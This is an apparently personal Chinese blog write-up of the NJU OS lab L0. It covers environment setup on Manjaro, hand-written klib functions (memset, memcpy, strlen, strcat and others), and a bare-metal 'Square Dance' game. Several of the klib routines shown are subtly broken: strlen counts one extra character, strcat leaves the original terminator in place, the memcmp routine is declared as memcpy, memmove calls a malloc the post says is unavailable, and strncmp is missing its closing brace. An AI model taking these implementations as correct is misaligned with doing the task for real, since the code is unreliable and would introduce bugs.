class="code"><pre><span class="line">copy_from_disk(elf32, <span class="number">4096</span>, <span class="number">0</span>); <span class="comment">// 从磁盘读取 ELF 文件头</span></span><br><span class="line"><span class="keyword">if</span> (elf-&gt;e_machine == EM_386) &#123;  <span class="comment">// x86 (32-bit)</span></span><br><span class="line">  load_elf32(elf32); <span class="comment">// 从磁盘加载二进制文件到 ELF 文件描述的位置</span></span><br><span class="line">  ((<span class="type">void</span>(*)())(<span class="type">uint32_t</span>)elf32-&gt;e_entry)(); <span class="comment">// 跳转到加载的代码执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  在之前从github上拉取下来的实验目录下，切换到master分支，继续拉取<strong>L0</strong>实验的代码即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy L0</span><br></pre></td></tr></table></figure></p><p>  本次实验可能还需要运行在qemu实验环境下，因此还需要安装qemu实验环境，执行如下命令<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S qemu qemu-extra-arch</span><br></pre></td></tr></table></figure></p><p>  最后，编译时还可能需要一些额外的库<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S gcc-multilib slib</span><br></pre></td></tr></table></figure></p><p>  最后，由于是在manjaro中进行实验，需要设置一些额外的软链接，使程序正常运行<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/bin/x86_64-pc-linux-gnu-gcc /usr/bin/x86_64-linux-gnu-gcc</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/bin/ld /usr/bin/x86_64-linux-gnu-ld</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/bin/objcopy /usr/bin/x86_64-linux-gnu-objcopy</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/7cde800afe2d8067e0b8f97a1c44fbc304743d67">实验实现</a></p><h3 id="实现AbstractMachine中klib的缺失函数"><a href="#实现AbstractMachine中klib的缺失函数" class="headerlink" title="实现AbstractMachine中klib的缺失函数"></a>实现AbstractMachine中klib的缺失函数</h3><p>  即这里需要实现一些常用的C语言函数，这里会实现部分功能(类似malloc等，由于还未建立虚拟内存机制，则当下无法实现</p><h4 id="函数实现"><a href="#函数实现" class="headerlink" title="函数实现"></a>函数实现</h4><ol><li><code>void *memset(void *s, int c, size_t n)</code><br>根据<code>man 3 memset</code>说明，其将s指向的地址的前n个字节，设置为字节c，因此我们只需要将s当作<code>unsigned char *</code>类型的指针即可，然后依次赋值<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *s, <span class="type">int</span> c, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i != n; ++i) &#123;</span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span>*)s)[i] = (<span class="type">unsigned</span> <span class="type">char</span>)c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>void *memcpy(void *dst, const void *src, size_t n)</code><br>和1.是类似的思路，将其当作<code>unsigned char*</code>类型进行遍历赋值即可<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dst, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i != n; ++i) &#123;</span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span>*)dst)[i] = ((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)src)[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>void *memmove(void *dst, const void *src, size_t n)</code><br>其和2的作用是一样的，但是该方法<code>src</code>和<code>dst</code>可能重合。因此先复制到中间变量，然后在复制到目标地址中。其实相当于调用两次<code>memcpy</code>即可<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">memmove</span><span class="params">(<span class="type">void</span> *dst, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line"><span class="comment">//首先申请相关大小的堆空间</span></span><br><span class="line"><span class="type">void</span> *temp = <span class="built_in">malloc</span>(n);</span><br><span class="line">assert(temp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(temp, src, n);</span><br><span class="line"><span class="built_in">memcpy</span>(dst, temp, n);</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>int memcmp(const void *s1, const void *s2, size_t n)</code><br>根据<code>man 3 memcpy</code>可知，<code>memcpy</code>将<code>s1</code>和<code>s2</code>当作<code>unsigned char</code>类型，而其返回结果是<code>s1</code>和<code>s2</code>第一个不相等的字符相减的结果。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">memcpy</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *s1, <span class="type">const</span> <span class="type">void</span> *s2, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i != n; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span>(((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)s1)[i] &lt; ((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)s2)[i]) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)s1)[i] &gt; ((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)s2)[i]) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>size_t strlen(const char *s)</code><br>即遍历直到第一个为0的字符为止<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line"><span class="type">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(s[len++]) &#123;;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>char *strcat(char *dst, const char *src)</code><br>根据<code>man 3 strcat</code>可知，其将<code>src</code>指向的字符串拼接到<code>dst</code>后面，并且可以默认<code>dst</code>留有足够的空间(即<code>dst</code>剩余空间足够容纳<code>src</code>指向的字符串，及末尾的’\x00’)<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span> &#123;</span><br><span class="line"><span class="type">size_t</span> dstLen = <span class="number">0</span>, srcLen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(dst[dstLen++]) &#123;; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(src[srcLen]) &#123;</span><br><span class="line">dst[dstLen++] = src[srcLen++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst[dstLen] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>char *strcpy(char *dst, const char *src)</code><br>即其复制的时候，以<code>src</code>的’\x00’结束，并且’\x00’字符也会被复制<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span> &#123;</span><br><span class="line"><span class="type">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(src[len]) &#123;</span><br><span class="line">dst[len] = src[len];</span><br><span class="line">++len;</span><br><span class="line">&#125;</span><br><span class="line">dst[len] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>char *strncpy(char *dst, const char *src, size_t n)</code><br>和7.的思路是一致的，但是其确保每次都写入n个字节——当<code>src</code>个数不足n个时，以’\x00’进行拓展;当个数超过n个时，则进行截断。注意的是，如果<code>src</code>的第一个’\x00’的在第n个之后，则复制的时候，不会复制’\x00’<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line"><span class="type">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(src[len] &amp;&amp; len &lt; n) &#123;</span><br><span class="line">dst[len] = src[len];</span><br><span class="line">++len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(len &lt; n) &#123; dst[len++] = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>int strcmp(const char *s1, const char *s2)</code><br>思路和<code>memcmp</code>完全一样，但需要注意以下如果s1字符串和s2字符串长度和每一位字符都相等，其需要进行中止<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>;s1[i] || s2[i]; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span>(s1[i] &lt; s2[i]) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s1[i] &gt; s2[i]) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>int strncmp(const char *s1, const char *s2, size_t n)</code><br>其和9.的思路也是完全一样的，除了额外添加的中止条件:长度小于等于n<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n &amp;&amp; (s1[i] || s2[i]); ++i) &#123;</span><br><span class="line"><span class="keyword">if</span>(s1[i] &lt; s2[i]) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s1[i] &gt; s2[i]) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li></ol><h4 id="程序编译和链接"><a href="#程序编译和链接" class="headerlink" title="程序编译和链接"></a>程序编译和链接</h4><p>  最后，我们可以使用上述这些标准库，实现一个简单的测试样例，首先在文件系统下任意路径下创建一个测试文件夹，并创建一个测试文件.c和对应的Makefile文件，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;klib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> *argv)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Hello, world\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NAME := test</span><br><span class="line">SRCS := test.c</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(AM_HOME)</span>/Makefile</span><br></pre></td></tr></table></figure><p>  然后需要进行编译,文件中已经设置好了<strong>AM_HOME</strong>环境变量为真实的<strong>am</strong>文件夹路径，则执行make命令即可，如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make ARCH=x86_64-qemu run</span><br></pre></td></tr></table></figure></p><h3 id="实现可移植的、直接运行在计算机硬件上的小游戏"><a href="#实现可移植的、直接运行在计算机硬件上的小游戏" class="headerlink" title="实现可移植的、直接运行在计算机硬件上的小游戏"></a>实现可移植的、直接运行在计算机硬件上的小游戏</h3><h4 id="游戏实现"><a href="#游戏实现" class="headerlink" title="游戏实现"></a>游戏实现</h4><p>  实际上在<strong>amgame</strong>文件夹下，已经有比较完善的程序框架了，因此我们只需要在这个基础上进行补全即可。<br>  而对于小游戏，我之前在coursera学习了一门很有意思的课<strong>Build a Modern Computer from First Principles: Nand to Tetris</strong>, 在这门课上有一个很有意思的游戏——“Square Dance”，准备实现这个游戏<br>  这个游戏实现起来并不是很难，只需要在屏幕上根据相关参数显示正方形即可，其相关的参数包括正方形的大小和正方形的位置。<br>  因此我们使用如下信息记录正方形的参数</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SQUARE</span> &#123;</span></span><br><span class="line"><span class="type">int</span> x, y, edge, side;</span><br><span class="line">&#125; Square;</span><br></pre></td></tr></table></figure><p>  其中<code>x</code>、<code>y</code>分别表示正方形左顶点在显示器上的坐标，而<code>edge</code>则表示正方形的边长, <code>side</code>表示正方形的单位长度在显示器上的像素点个数</p><p>  下面则实现在显示器上画出该图形，模板已经给了一个画直线的代码，然后进行简单包装即可(即增量的画出正方形变化的像素即可)，这里需要特别注意，避免一次画大量数据，导致爆栈。</p><p>  其次，则是对于正方形的操作，其支持位移和形变，即上移’↑’、下移’↓’、左移’←’和右移’→’的位移变化，以及放大’+’和缩小’-‘的形状变化。这里需要注意的是，其位移变化不能让正方形超出边界，其形状变化同样也不可以让正方形过大或过小。<br>  最终的代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;game.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SQUARE</span> &#123;</span></span><br><span class="line"><span class="type">int</span> x, y, edge, side;</span><br><span class="line">&#125; Square;</span><br><span class="line">Square square;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//为了避免爆栈，所以一次只画一个单元的图像</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">safe_draw_line</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> w, <span class="type">int</span> h, <span class="type">int</span> color)</span> &#123;</span><br><span class="line"><span class="type">int</span> row = x, row_end = x + w;</span><br><span class="line"><span class="keyword">while</span>(row &lt; row_end) &#123;</span><br><span class="line"><span class="type">int</span> col = y, col_end = y + h;</span><br><span class="line"><span class="keyword">while</span>(col &lt; col_end) &#123;</span><br><span class="line">draw_line(row, col, square.side, square.side, color);</span><br><span class="line">col += square.side;</span><br><span class="line">&#125;</span><br><span class="line">row += square.side;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查左边碰壁;原始最右侧画成黑色，新的最左侧画成白色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">move_left</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(square.x - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x + edge - 1, y)起点的宽度为1，高度为edge的黑线</span></span><br><span class="line">safe_draw_line((square.x + square.edge - <span class="number">1</span>) * square.side, square.y * square.side, square.side, square.edge * square.side, BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x - 1, y)起点的宽度为1，高度为edge的白线</span></span><br><span class="line">safe_draw_line((square.x - <span class="number">1</span>) * square.side, square.y * square.side, square.side, square.edge * square.side, WHITE);</span><br><span class="line"></span><br><span class="line">--square.x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查右边碰壁;原始最左侧画成黑色，新的最右侧画成白色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">move_right</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span>((square.x + square.edge) * square.side &lt; w) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x, y)起点的宽度为1，高度为edge的黑线</span></span><br><span class="line">safe_draw_line(square.x * square.side, square.y * square.side, square.side, square.edge * square.side, BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x + edge, y)起点的宽度为1，高度为edge的白线</span></span><br><span class="line">safe_draw_line((square.x + square.edge) * square.side, square.y * square.side, square.side, square.edge * square.side, WHITE);</span><br><span class="line"></span><br><span class="line">++square.x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查上边碰壁;原始最下侧画成黑色，新的最上侧画成白色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">move_up</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(square.y - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x, y + edge - 1)起点的宽度为edge，高度为1的黑线</span></span><br><span class="line">safe_draw_line(square.x * square.side, (square.y + square.edge - <span class="number">1</span>) * square.side, square.edge * square.side, square.side, BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x, y - 1)起点的宽度为edge，高度为1的白线</span></span><br><span class="line">safe_draw_line(square.x * square.side, (square.y - <span class="number">1</span>) * square.side, square.edge * square.side, square.side, WHITE);</span><br><span class="line"></span><br><span class="line">--square.y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查下边碰壁;原始最上侧画成黑色，新的最下侧画成白色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">move_down</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span>((square.y + square.edge) * square.side &lt; h) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x, y)起点的宽度为edge，高度为1的黑线</span></span><br><span class="line">safe_draw_line(square.x * square.side, square.y * square.side, square.edge * square.side, square.side, BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x, y + edge)起点的宽度为edge，高度为1的白线</span></span><br><span class="line">safe_draw_line(square.x * square.side, (square.y + square.edge) * square.side, square.edge * square.side, square.side, WHITE);</span><br><span class="line"></span><br><span class="line">++square.y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查边长不能小于1;将最下方和最右方的边画成黑色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">figure_small</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(square.edge - <span class="number">1</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x, y + square.edge - 1)起点的宽度为edge，高度为1的黑线</span></span><br><span class="line">safe_draw_line(square.x * square.side, (square.y + square.edge - <span class="number">1</span>) * square.side, square.edge * square.side, square.side, BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x + square.edge - 1, y)起点的宽度为1， 高度为edge - 1的黑线</span></span><br><span class="line">safe_draw_line((square.x + square.edge - <span class="number">1</span>) * square.side, square.y * square.side, square.side, (square.edge - <span class="number">1</span>) * square.side, BLACK);</span><br><span class="line"></span><br><span class="line">--square.edge;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查增加的边长不能越界;将新的下方和最右方的边画成白色</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">figure_big</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span>((square.x + square.edge) * square.side &lt; w &amp;&amp; (square.y + square.edge) * square.side &lt; h) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x, y + edge)起点的宽度为edge + 1，高度为1的白线</span></span><br><span class="line">safe_draw_line(square.x * square.side, (square.y + square.edge) * square.side, (square.edge + <span class="number">1</span>) * square.side, square.side, WHITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(x + square.edge, y)起点的宽度为1， 高度为edge的白线</span></span><br><span class="line">safe_draw_line((square.x + square.edge) * square.side, square.y * square.side, square.side, square.edge * square.side, WHITE);</span><br><span class="line"></span><br><span class="line">++square.edge;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">square_init</span><span class="params">()</span> &#123;</span><br><span class="line">square.x = square.y = <span class="number">0</span>;</span><br><span class="line">square.edge = <span class="number">1</span>;</span><br><span class="line">square.side = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//画一条宽度为edge， 高度为edge的线即可</span></span><br><span class="line">safe_draw_line(square.x * square.side, square.y * square.side, square.edge * square.side, square.edge * square.side, WHITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Operating system is a C program!</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  ioe_init();</span><br><span class="line">  gpu_init();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span 